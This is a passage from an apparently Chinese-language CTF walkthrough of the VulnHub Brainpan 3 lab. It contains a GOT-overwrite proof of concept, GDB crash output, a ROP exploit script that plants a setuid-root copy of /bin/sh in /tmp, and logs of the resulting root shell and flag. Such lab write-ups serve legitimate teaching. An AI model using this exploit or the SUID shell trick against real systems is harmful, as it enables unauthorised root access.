<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line"><span class="comment"># message 1</span></span><br><span class="line"><span class="comment"># .got.plt:0804B05C off_804B05C     dd offset strtok        ; DATA XREF: _strtok</span></span><br><span class="line">payload = 10 * <span class="string">&#x27;\x41&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x42&#x27;</span></span><br><span class="line">payload += 12 * <span class="string">&#x27;\x42&#x27;</span></span><br><span class="line"><span class="comment"># overwrite 2nd struct it&#x27;s requestername pointer</span></span><br><span class="line">payload += p(0x0804B05C) <span class="comment"># strtok GOT, becomes 0x43434343</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="comment"># message 2</span></span><br><span class="line">payload += 4 * <span class="string">&#x27;\x43&#x27;</span> <span class="comment"># written to got.strtok</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x44&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"> </span><br><span class="line">open(<span class="string">&#x27;poc.msg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(payload)</span><br></pre></td></tr></table></figure>

<p>一些GDB</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/150xw 0x804c388</span><br><span class="line">0x804c388:    0x00000001    0x0804c398    0x0804c3a8    0x00000011</span><br><span class="line">0x804c398:    0x41414141    0x41414141    0x00004141    0x000000d1</span><br><span class="line">0x804c3a8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3b8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3c8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3d8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3e8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3f8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c408:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c418:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c428:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c438:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c448:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c458:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c468:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c478:    0x42424242    0x0804b05c    0x0804c400    0x00000011</span><br><span class="line">0x804c488:    0x00000000    0x00000000    0x00000000    0x000000d1</span><br><span class="line">0x804c498:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4a8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4b8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4c8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4d8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4e8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4f8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c508:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c518:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c528:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c538:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c548:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c558:    0x00000000    0x00000000    0x00000000    0x00020aa1</span><br><span class="line">...</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x43434343</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff2ac --&gt; 0x8048ce3 (:    mov    DWORD PTR [ebp-0x48],eax)</span><br><span class="line">0004| 0xbffff2b0 --&gt; 0x0 </span><br><span class="line">0008| 0xbffff2b4 --&gt; 0x8048f4d --&gt; 0x100007c </span><br><span class="line">0012| 0xbffff2b8 --&gt; 0x804c008 --&gt; 0xfbad2488 </span><br><span class="line">0016| 0xbffff2bc (<span class="string">&#x27;B&#x27;</span> repeats 100 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">0020| 0xbffff2c0 (<span class="string">&#x27;B&#x27;</span> repeats 96 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">0024| 0xbffff2c4 (<span class="string">&#x27;B&#x27;</span> repeats 92 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">0028| 0xbffff2c8 (<span class="string">&#x27;B&#x27;</span> repeats 88 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x43434343 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>基于GDB的输出，可以看到，如果执行pop（4）小工具，将返回第一条（上一条）消息的“目标”数据，该消息由“strncpy（dest，aMessages [i]”存储在堆栈中]-&gt; Msg，100u）;’。</p>
<h4 id="root所有的一切"><a href="#root所有的一切" class="headerlink" title="root所有的一切"></a>root所有的一切</h4><p>编写了一个ROP payload，通过从3个阶段中添加0xE900来将取自atol的atol的地址加载到eax中，并将该值累加至系统，然后使用参数’/tmp/foo’调用eax（system），这是一个脚本由我创建并在执行时将root拥有的SUID shell复制到tmp。</p>
<p>rootsploit.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">def p(v):</span><br><span class="line">    <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line"> </span><br><span class="line">__strtok_got    = 0x0804B05C</span><br><span class="line">__atol_got      = 0x0804B04C</span><br><span class="line">__ppppr         = 0x08048DDC</span><br><span class="line">__foo_str       = 0x08048ED8</span><br><span class="line">__int16_e800h   = 0x080480C7</span><br><span class="line">__int16_0100h   = 0x08048093</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">rop  = p(0x08048790)</span><br><span class="line">rop += p(0x08048E06)</span><br><span class="line">rop += p((__atol_got - 0x01270304) &amp; 0xFFFFFFFF)</span><br><span class="line">rop += p(0x08048FEB)</span><br><span class="line">rop += p(0x08048E06)</span><br><span class="line">rop += p((__int16_e800h - 0x01270304) &amp; 0xFFFFFFFF)</span><br><span class="line">rop += p(0x08048FEB)</span><br><span class="line">rop += p(0x08048E06)</span><br><span class="line">rop += p((__int16_0100h - 0x01270304) &amp; 0xFFFFFFFF)</span><br><span class="line">rop += p(0x08048FEB)</span><br><span class="line">rop += p(0x08048786)</span><br><span class="line">rop += p(__foo_str + 23)</span><br><span class="line"> </span><br><span class="line">payload = 10 * <span class="string">&#x27;A&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += rop.ljust(212, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># padding till 212 eq next struct requestername pointer</span></span><br><span class="line">payload += p(0x0804B05C) <span class="comment"># strtok GOT, becomes __ppppr</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">payload += p(__ppppr) <span class="comment"># written to got.strtok</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;A&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"> </span><br><span class="line">open(<span class="string">&#x27;exploit.msg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(payload)</span><br><span class="line">foocode = <span class="string">&quot;cp /bin/sh /tmp/r00tsh3ll;chown root:root /tmp/r00tsh3ll;chmod 4755 /tmp/r00tsh3ll&quot;</span></span><br><span class="line">open(<span class="string">&#x27;/tmp/foo&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(foocode)</span><br><span class="line">os.system(<span class="string">&#x27;chmod +x /tmp/foo&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>从tmp文件夹执行漏洞利用脚本，并将创建的exploit.msg移至/opt/.messenger文件夹，然后稍等。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan3:/tmp$ python rootsploit.py</span><br><span class="line">python rootsploit.py</span><br><span class="line">python rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 20K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rw-r--r--  1 puck   dev     434 Feb  6 13:03 exploit.msg</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ mv exploit.msg /opt/.messenger/</span><br><span class="line">mv exploit.msg /opt/.messenger/</span><br><span class="line">mv exploit.msg /opt/.messenger/</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 16K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 16K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 128K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:04 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwsr-xr-x  1 root   root   110K Feb  6 13:04 r00tsh3ll</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 128K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:04 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwsr-xr-x  1 root   root   110K Feb  6 13:04 r00tsh3ll</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ./r00tsh3ll</span><br><span class="line">./r00tsh3ll</span><br><span class="line">./r00tsh3ll</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">id</span><br><span class="line">uid=1001(puck) gid=1004(dev) euid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">brainpan.8.gz</span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line">ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwx------  2 root root 4096 Jul 16  2015 .</span><br><span class="line">drwxr-xr-x 21 root root 4096 Jun 17  2015 ..</span><br><span class="line">-rw-------  1 root root    0 Jul 16  2015 .bash_history</span><br><span class="line">-rw-------  1 root root 3106 Feb 19  2014 .bashrc</span><br><span class="line">-rw-------  1 root root  140 May 31  2015 .profile</span><br><span class="line">-rw-------  1 root root  314 Jun 23  2015 brainpan.8.gz</span><br></pre></td></tr></table></figure>

<p>成功的取得了root权限</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub205.jpg"></p>
<p>将其中的brainpan.8.gz复制到/home/anansi文件夹，然后开启python的SimpleHTTPServer，将brainpan.8.gz下载之后解压，读取其中的内容，发现如下所示的文本，正好是flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># file brainpan.8 </span></span><br><span class="line">brainpan.8: troff or preprocessor input, ASCII text</span><br><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># cat brainpan.8 </span></span><br><span class="line">.TH man 8 <span class="string">&quot;20 May 2015&quot;</span> <span class="string">&quot;3.0&quot;</span> <span class="string">&quot;brainpan 3&quot;</span></span><br><span class="line"></span><br><span class="line">.SH DESCRIPTION</span><br><span class="line">Congratulations, you win! Thanks <span class="keyword">for</span> playing!</span><br><span class="line"></span><br><span class="line">.SH FLAG</span><br><span class="line">.B</span><br><span class="line">flag&#123;tricksy-hobbitses-use-unix&#125;</span><br><span class="line"></span><br><span class="line">.SH BUGS</span><br><span class="line">You found them all. </span><br><span class="line"></span><br><span class="line">.SH AUTHOR</span><br><span class="line">superkojiman - </span><br><span class="line">.B</span><br><span class="line">http://blog.techorganic.com</span><br><span class="line"></span><br><span class="line">.SH TESTERS</span><br><span class="line">Special thanks go to barrebas and Swappage taking the time to <span class="built_in">test</span> Brainpan 3!</span><br><span class="line">.br</span><br><span class="line">barrebas - </span><br><span class="line">.B</span><br><span class="line">https://twitter.com/barrebas</span><br><span class="line">.br</span><br><span class="line">Swappage - </span><br><span class="line">.B</span><br><span class="line">https://twitter.com/Swappage</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub206.jpg"></p>
<h4 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h4><ul>
<li>缓冲区溢出</li>
<li>堆栈溢出</li>
<li>字符串格式漏洞</li>
<li>反引号命令注入</li>
<li><blockquote>
<p>&amp;2管道命令输出</p>
</blockquote>
</li>
<li>python的pwntools模块使用编写poc</li>
<li>pwndbg调试shellcode</li>
<li>ROPGadget找到清晰的eax小工具</li>
<li>偏移量累积寻找</li>
</ul>
<p><font color="red">Game over</font></p>
<p>这次傻瓜式一键通关脚本就在方法一的尾部，enjoy it …</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
</search>
